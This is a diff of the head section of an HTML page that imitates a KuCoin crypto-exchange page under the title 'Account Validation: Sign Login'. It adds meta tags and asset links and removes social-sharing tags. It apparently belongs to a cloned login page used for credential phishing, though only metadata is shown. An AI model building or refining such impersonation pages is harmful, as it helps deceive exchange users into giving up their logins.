@@ -139,7 +139,24 @@
 <html translate="no" lang="en" dir="ltr">
 
 <head>
-
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="renderer" content="webkit">
+  <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
+  <meta name="theme-color" content="#000000">
+  <meta httpequiv="Cache-Control" content="no-cache, max-age=0, must-revalidate">
+  <meta name="twitter:site" content="@kucoingem">
+  <meta name="google" content="notranslate">
+  <meta name="description" content="Validate webAuth , and get your first crypto today!">
+  <meta name="keywords" content="Sign Up,Register for an Account,Open an Account">
+  <link rel="preload" href="assets.staticimg.com/natasha/npm/%40kux/font/KFOmCnqEu92Fr1Mu4mxKKTU1Kg.woff2" as="font" type="font/woff2" crossorigin="">
+  <link rel="preload" href="assets.staticimg.com/natasha/npm/%40kux/font/KFOlCnqEu92Fr1MmEU9fBBc4AMP6lQ.woff2" as="font" type="font/woff2" crossorigin="">
+  <link rel="preload" href="assets.staticimg.com/natasha/npm/%40kux/font/KFOlCnqEu92Fr1MmEU9fABc4AMP6lbBP.woff2" as="font" type="font/woff2" crossorigin="">
+  <link rel="preload" href="assets.staticimg.com/natasha/npm/%40kux/font/KFOlCnqEu92Fr1MmWUlfBBc4AMP6lQ.woff2" as="font" type="font/woff2" crossorigin="">
+  <link rel="stylesheet" href="assets.staticimg.com/natasha/npm/%40kufox/mui%402.5.14/umd/kufox-mui.umd.min.css">
+  <noscript>
+    <link rel="stylesheet" href="assets.staticimg.com/natasha/npm/%40kux/font/css.css">
+  </noscript>
   <title>Account Validation: Sign Login</title>
   <link href="assets.staticimg.com/natasha/npm/anomaly/style.css" rel="prefetch" as="style" crossorigin="">
   <link href="assets.staticimg.com/natasha/npm/fontsGoogleapis/googleapis.css" rel="prefetch" as="style" crossorigin="">
@@ -180,13 +197,7 @@
   <meta property="og:locale:alternate" content="fil_PH" data-rh="true">
   <meta property="og:locale:alternate" content="ar_AE" data-rh="true">
   <meta property="og:locale:alternate" content="ur_PK" data-rh="true">
-  <meta property="og:title" content="Account: Revalidation">
-  <meta name="twitter:title" content="Account: Revalidation">
-  <meta property="og:image:alt" content="Account: Revalidation">
-  <meta property="twitter:image:alt" content="Account: Revalidation">
-  <meta property="og:description" content="Account Validation, and get your first crypto today!">
-  <meta name="twitter:description" content="Account Validation, and get your first crypto today!">
-  <style id="ssg-jss-node" ssg-jss-node="1" type="text/css">
+
     .css-76ygvu .gbiz-headeroom {
       border-bottom: 1px solid rgba(29, 29, 29, 0.08);
     }
